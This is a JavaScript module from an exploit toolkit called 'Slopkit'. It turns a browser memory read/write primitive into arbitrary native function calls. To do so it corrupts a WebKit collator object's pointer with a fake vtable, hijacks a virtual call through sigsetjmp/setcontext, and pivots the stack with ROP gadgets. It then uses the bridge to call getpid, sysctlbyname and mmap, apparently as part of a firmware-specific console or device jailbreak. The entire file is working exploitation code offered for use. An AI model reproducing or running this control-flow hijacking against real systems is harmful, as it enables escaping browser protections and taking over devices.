(function (root) {
    "use strict";

    const NS = root.Slopkit = root.Slopkit || {};
    const { U64, writeU64LE } = NS;
    const { NativeBuffer } = NS;
    if (!U64 || !NativeBuffer)
        throw new Error("u64.js and memory.js must be loaded before native.js");

    const BRIDGE = Object.freeze({
        fake: 0x100,
        vtable: 0x300,
        capture: 0x500,
        runContext: 0x600,
        returnContext: 0x780,
        stack: 0x908,
        result: 0xd80,
        sdkName: 0xe00,
        sdkOutput: 0xe40,
        sdkSize: 0xe50,
        contextSize: 0x120
    });

    // Warm-up and hijacked invocations deliberately share this bytecode callsite.
    // Keeping both redirected calls in the same loop preserves the native stack
    // layout captured by sigsetjmp, matching API.call() in the Java source.
    function nativeDispatchCallsite(compare, state) {
        while (state.phase < state.limit) {
            if (state.bridge) state.bridge.beforeNativeIteration(state.phase);
            state.result = compare("a", "b");
            state.phase++;
        }
        return state.result;
    }

    class NativeBridge {
        constructor(options) {
            this.memory = options.memory;
            this.profile = options.profile;
            this.webkitBase = options.webkitBase;
            this.kernelBase = options.kernelBase;
            this.arena = options.arenaView;
            this.arenaBase = options.arenaBase;
            this.collatorAddress = options.collatorAddress;
            this.compare = options.compare;
            this.originalCollator = new Uint8Array(options.originalCollator);
            this.busy = false;
            this.warmed = false;
            this.pending = null;
            if (!(this.arena instanceof Uint8Array) || this.arena.length < 0x1000)
                throw new Error("native bridge requires the retained 0x1000 arena");
            if (this.originalCollator.length < 8)
                throw new Error("collator snapshot is too small");
        }

        kernel(path) { return this.kernelBase + this.profile.offset(path); }
        webkit(path) { return this.webkitBase + this.profile.offset(path); }
        arenaAddress(offset) { return this.arenaBase + offset; }

        clear(offset, size) { this.arena.fill(0, offset, offset + size); }
        put64(offset, value) { writeU64LE(this.arena, offset, value); }
        get64(offset) { return NS.readU64LE(this.arena, offset); }

        warm(iterations) {
            if (this.warmed) return;
            const state = { phase: 0, limit: iterations || 10000,
                bridge: null, result: 0 };
            nativeDispatchCallsite(this.compare, state);
            this.warmed = true;
        }

        verifyCollatorSnapshot() {
            const current = this.memory.read(this.collatorAddress + 0x18,
                this.originalCollator.length);
            for (let i = 0; i < current.length; ++i) {
                if (current[i] !== this.originalCollator[i])
                    throw new Error(`collator snapshot mismatch at +0x${i.toString(16)}`);
            }
        }

        configureDirectContext(offset, target) {
            // The virtual call supplies its object as RDI. Pointing m_collator
            // directly at the context mirrors the Java fake-Klass primitive:
            // the first qword is used as a vtable pointer for dispatch, then is
            // free for sigsetjmp to overwrite with the captured return RIP.
            this.put64(offset, this.arenaAddress(BRIDGE.vtable));
            this.put64(BRIDGE.vtable + 0x128,
                target);
        }

        patchCollator(objectAddress) {
            const pointer = new Uint8Array(8);
            writeU64LE(pointer, 0, objectAddress);
            this.memory.write(this.collatorAddress + 0x18, pointer);
        }

        restoreCollator() {
            this.memory.write(this.collatorAddress + 0x18, this.originalCollator);
            const restored = this.memory.read(this.collatorAddress + 0x18,
                this.originalCollator.length);
            for (let i = 0; i < restored.length; ++i) {
                if (restored[i] !== this.originalCollator[i])
                    throw new Error(`collator restore mismatch at +0x${i.toString(16)}`);
            }
            this.memory.park(this.collatorAddress + 0x18);
        }

        buildRunContext(target, args) {
            const cap = BRIDGE.capture;
            const out = BRIDGE.runContext;
            const at = (name) => this.profile.offset(`native.context.offsets.${name}`);
            const registers = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"];
            this.clear(out, BRIDGE.contextSize);
            // A native target must enter with the callee-saved register state
            // from the redirected call it will eventually return into.
            this.put64(out + at("rbx"), this.get64(cap + 0x08));
            this.put64(out + at("rbp"), this.get64(cap + 0x18));
            this.put64(out + at("r12"), this.get64(cap + 0x20));
            this.put64(out + at("r13"), this.get64(cap + 0x28));
            this.put64(out + at("r14"), this.get64(cap + 0x30));
            this.put64(out + at("r15"), this.get64(cap + 0x38));
            for (let i = 0; i < registers.length; ++i)
                this.put64(out + at(registers[i]), args[i] || 0);
            this.put64(out + at("rip"), target);
            this.put64(out + at("rsp"), this.arenaAddress(BRIDGE.stack));

            let cursor = BRIDGE.stack;
            const push = (value) => { this.put64(cursor, value); cursor += 8; };
            push(this.webkit("webkit.gadgets.popRdi"));
            push(this.arenaAddress(BRIDGE.result));
            push(this.webkit("webkit.gadgets.movPtrRdiRax"));
            // The second virtual call overlays the first call's native stack.
            // Pivot to the captured RSP and let its return address resume the
            // current callsite after the target result has been stored.
            push(this.webkit("webkit.gadgets.popRsp"));
            push(this.get64(cap + 0x10));
            if ((this.arenaAddress(BRIDGE.stack) & 0xf) !== 8)
                throw new Error("native bridge stack is not SysV aligned");
            this.put64(BRIDGE.result, U64.fromHex("0xfeedfacefeedface"));
        }

        beforeNativeIteration(phase) {
            if (!this.pending) throw new Error("native bridge has no pending call");
            if (phase === 0) {
                this.clear(BRIDGE.capture, 0x60);
                this.configureDirectContext(BRIDGE.capture,
                    this.kernel("native.context.captureEntry"));
                this.patchCollator(this.arenaAddress(BRIDGE.capture));
                return;
            }
            if (phase === 1) {
                const returnRip = this.get64(BRIDGE.capture);
                const returnRsp = this.get64(BRIDGE.capture + 0x10);
                if (returnRip.isZero() || returnRsp.isZero())
                    throw new Error("sigsetjmp context capture failed");
                const rip = returnRip.toPointerNumber();
                const rsp = returnRsp.toPointerNumber();
                if (rip < 0x800000000 || rip >= 0x900000000
                    || rsp <= 0x100000000 || (rsp & 7) !== 0)
                    throw new Error("sigsetjmp captured invalid return state");
                if (this.pending.chain)
                    this.buildChainContext(this.pending.chain);
                else
                    this.buildRunContext(this.pending.target, this.pending.args);
                this.configureDirectContext(BRIDGE.runContext,
                    this.kernel("native.context.setcontextEntry"));
                this.patchCollator(this.arenaAddress(BRIDGE.runContext));
                return;
            }
            throw new Error(`unexpected native bridge phase ${phase}`);
        }

        call(target, args) {
            if (this.busy) throw new Error("native bridge is not reentrant");
            const address = U64.from(target).toPointerNumber();
            const argv = (args || []).map((value) => U64.from(value));
            if (argv.length > 6) throw new RangeError("native call supports six arguments");
            while (argv.length < 6) argv.push(U64.zero());
            this.warm();
            this.verifyCollatorSnapshot();
            this.busy = true;
            this.pending = { target: address, args: argv };
            const state = { phase: 0, limit: 2, bridge: this, result: 0 };
            try {
                nativeDispatchCallsite(this.compare, state);
                if (state.phase !== 2)
                    throw new Error(`native callsite stopped at phase ${state.phase}`);
                return this.get64(BRIDGE.result);
            } finally {
                let restoreError = null;
                try { this.restoreCollator(); } catch (error) { restoreError = error; }
                this.pending = null;
                this.busy = false;
                if (restoreError) throw restoreError;
            }
        }

        buildChainContext(chain) {
            const cap = BRIDGE.capture;
            const out = BRIDGE.runContext;
            const at = (name) => this.profile.offset(`native.context.offsets.${name}`);
            this.clear(out, BRIDGE.contextSize);
            this.put64(out + at("rbx"), this.get64(cap + 0x08));
            this.put64(out + at("rbp"), this.get64(cap + 0x18));
            this.put64(out + at("r12"), this.get64(cap + 0x20));
            this.put64(out + at("r13"), this.get64(cap + 0x28));
            this.put64(out + at("r14"), this.get64(cap + 0x30));
            this.put64(out + at("r15"), this.get64(cap + 0x38));
            const buf = chain.buffer;
            this.put64(out + at("rip"), buf.get64(0));
            this.put64(out + at("rsp"), buf.address + 8);
            const c = chain.cursor;
            buf.put64(c, this.webkit("webkit.gadgets.popRdi"));
            buf.put64(c + 8, this.arenaAddress(BRIDGE.result));
            buf.put64(c + 16, this.webkit("webkit.gadgets.movPtrRdiRax"));
            buf.put64(c + 24, this.webkit("webkit.gadgets.popRsp"));
            buf.put64(c + 32, this.get64(cap + 0x10));
            this.put64(BRIDGE.result, U64.fromHex("0xfeedfacefeedface"));
        }

        callChain(chainBuffer, chainCursor) {
            if (this.busy) throw new Error("native bridge is not reentrant");
            this.warm();
            this.verifyCollatorSnapshot();
            this.busy = true;
            this.pending = { chain: { buffer: chainBuffer, cursor: chainCursor } };
            const state = { phase: 0, limit: 2, bridge: this, result: 0 };
            try {
                nativeDispatchCallsite(this.compare, state);
                if (state.phase !== 2)
                    throw new Error(`native chain stopped at phase ${state.phase}`);
                return this.get64(BRIDGE.result);
            } finally {
                let restoreError = null;
                try { this.restoreCollator(); } catch (error) { restoreError = error; }
                this.pending = null;
                this.busy = false;
                if (restoreError) throw restoreError;
            }
        }

        callOffset(path, args) { return this.call(this.kernel(path), args); }
        callI32(target, args) { return this.call(target, args).toInt32(); }
        callOffsetI32(path, args) { return this.callOffset(path, args).toInt32(); }

        verify() {
            const pid = this.callOffsetI32("native.exports.getpid", []);
            if (pid <= 0) throw new Error(`getpid native smoke test returned ${pid}`);
            const firmware = this.detectFirmware();
            if (firmware !== this.profile.firmware)
                throw new Error(`native firmware ${firmware} does not match exact profile ${this.profile.firmware}`);
            return pid;
        }

        detectFirmware() {
            const name = "kern.sdk_version";
            this.clear(BRIDGE.sdkName, 0x20);
            for (let i = 0; i < name.length; ++i)
                this.arena[BRIDGE.sdkName + i] = name.charCodeAt(i);
            this.clear(BRIDGE.sdkOutput, 8);
            this.clear(BRIDGE.sdkSize, 8);
            this.put64(BRIDGE.sdkSize, 8);
            const result = this.callOffsetI32("native.exports.sysctlbyname", [
                this.arenaAddress(BRIDGE.sdkName),
                this.arenaAddress(BRIDGE.sdkOutput),
                this.arenaAddress(BRIDGE.sdkSize), 0, 0
            ]);
            if (result !== 0)
                throw new Error(`kern.sdk_version returned ${result}`);
            const value = NS.readU32LE(this.arena, BRIDGE.sdkOutput);
            const major = (value >>> 24) & 0xff;
            const minor = (value >>> 16) & 0xff;
            if (major === 0)
                throw new Error(`kern.sdk_version returned 0x${value.toString(16)}`);
            return `${major.toString(16).padStart(2, "0")}.${minor
                .toString(16).padStart(2, "0")}`;
        }
    }

    class NativeAllocator {
        constructor(bridge, memory, options) {
            this.bridge = bridge;
            this.memory = memory;
            this.regionSize = options?.regionSize || 0x400000;
            this.regions = [];
            this.sequence = 0;
        }

        map(size) {
            const aligned = (size + 0x3fff) & ~0x3fff;
            const result = this.bridge.callOffset("native.exports.mmap",
                [0, aligned, 3, 0x1002, U64.ones(), 0]);
            if (result.isMinusOne()) throw new Error("mmap returned MAP_FAILED");
            const address = result.toPointerNumber();
            if (address <= 0x100000000 || (address & 0x3fff) !== 0)
                throw new Error(`mmap returned invalid address ${result.toHex()}`);
            const region = { address, size: aligned, used: 0 };
            this.regions.push(region);
            return region;
        }

        alloc(size, alignment, label) {
            const align = alignment || 0x10;
            if (!Number.isInteger(size) || size <= 0 || (align & (align - 1)) !== 0)
                throw new RangeError("invalid native allocation");
            let region = this.regions[this.regions.length - 1];
            let offset = region ? (region.used + align - 1) & ~(align - 1) : 0;
            if (!region || offset + size > region.size) {
                region = this.map(Math.max(this.regionSize, size + align));
                offset = 0;
            }
            const address = region.address + offset;
            region.used = offset + size;
            const buffer = new NativeBuffer(this.memory, address, size,
                label || `native-${++this.sequence}`);
            buffer.fill(0);
            return buffer;
        }

        release() {
            const failures = [];
            for (let i = this.regions.length - 1; i >= 0; --i) {
                const region = this.regions[i];
                try {
                    const result = this.bridge.callOffsetI32(
                        "native.exports.munmap", [region.address, region.size]);
                    if (result !== 0) {
                        failures.push(`0x${region.address.toString(16)}:${result}`);
                        continue;
                    }
                    this.regions.splice(i, 1);
                } catch (error) {
                    failures.push(`0x${region.address.toString(16)}:${error.message}`);
                }
            }
            if (failures.length)
                throw new Error(`native allocator munmap failed (${failures.join(", ")})`);
        }
    }

    NS.NativeBridge = NativeBridge;
    NS.NativeAllocator = NativeAllocator;
    NS.NativeBridgeLayout = BRIDGE;
    if (typeof module !== "undefined" && module.exports)
        module.exports = { NativeBridge, NativeAllocator, NativeBridgeLayout: BRIDGE };
})(typeof globalThis !== "undefined" ? globalThis : this);
